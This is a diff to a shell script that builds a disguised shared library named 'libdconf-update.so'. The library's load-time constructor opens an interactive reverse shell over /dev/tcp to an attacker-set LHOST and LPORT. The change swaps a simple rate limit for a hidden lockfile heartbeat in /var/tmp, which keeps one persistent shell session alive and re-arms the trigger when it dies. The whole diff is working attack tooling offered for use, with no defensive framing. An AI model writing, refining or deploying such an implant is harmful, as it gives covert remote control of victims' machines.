@@ -3,8 +3,8 @@
 LHOST="${LHOST:-}"
 LPORT="${LPORT:-4444}"
 OUT_FILE="libdconf-update.so"
-LOCKFILE="/var/tmp/.dconf-lock"
-RATE_LIMIT=120
+LOCKFILE="/var/tmp/.dconf-lock-root"
+SESSION_TIMEOUT=60
 
 if [[ -z "$LHOST" ]]; then
     echo "[-] LHOST is not set. Export it before running."
@@ -28,8 +28,11 @@ static int _should_fire(void) {
     struct stat st;
     if (stat("${LOCKFILE}", &st) == 0) {
         time_t now; time(&now);
-        if ((now - st.st_mtime) < ${RATE_LIMIT}) return 0;
+        // Lockfile touched within SESSION_TIMEOUT seconds means
+        // an active session heartbeat is running — do not fire
+        if ((now - st.st_mtime) < ${SESSION_TIMEOUT}) return 0;
     }
+    // No active session — claim the lockfile and fire
     FILE *f = fopen("${LOCKFILE}", "w");
     if (f) fclose(f);
     return 1;
@@ -51,7 +54,15 @@ static void _init(void) {
         close(fd);
     }
 
-    char *args[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1", NULL};
+    // Shell payload wrapped with heartbeat:
+    //   - writes PID to lockfile so session-aware guard knows a shell is active
+    //   - background loop touches lockfile every 30s while shell is alive
+    //   - when shell dies, loop removes lockfile so next trigger fires freely
+    char *args[] = {"/bin/bash", "-c",
+        "L=${LOCKFILE}; echo $$ > $L; "
+        "( while kill -0 $$ 2>/dev/null; do touch $L; sleep 30; done; rm -f $L ) & "
+        "bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1",
+        NULL};
     execv("/bin/bash", args);
     _exit(0);
 }
